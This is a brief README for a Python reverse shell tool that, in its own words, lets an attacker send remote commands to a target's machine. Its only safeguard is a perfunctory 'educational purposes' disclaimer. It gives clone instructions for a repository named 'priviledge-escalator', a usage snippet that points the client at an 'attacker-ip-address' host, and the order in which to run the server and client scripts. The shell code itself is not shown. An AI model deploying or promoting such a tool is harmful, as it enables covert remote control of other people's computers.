# Reverse Shell

## Disclaimer

This script is for educational purposes only, I don't endorse or promote it's illegal usage

## Table of Contents

1. [Overview](#overview)
2. [Features](#features)
3. [Languages](#languages)
4. [Installations](#installations)
5. [Usage](#usage)
6. [Run](#run)

## Overview

This script demonstrates a simple reverse shell

## Features

- It allows an attacker to send remote commands to the target's machine

## Languages

- Python 3.9.7

## Installations

```shell
git clone https://github.com/favoursyre/priviledge-escalator.git && cd priviledge-escalator
```

## Usage

For client.py

```python
host = "attacker-ip-address"
clientSide(host)
```

## Run

You first have to run server.py and then client.py

```bash
python server.py
```

Then

```python
python client.py
```
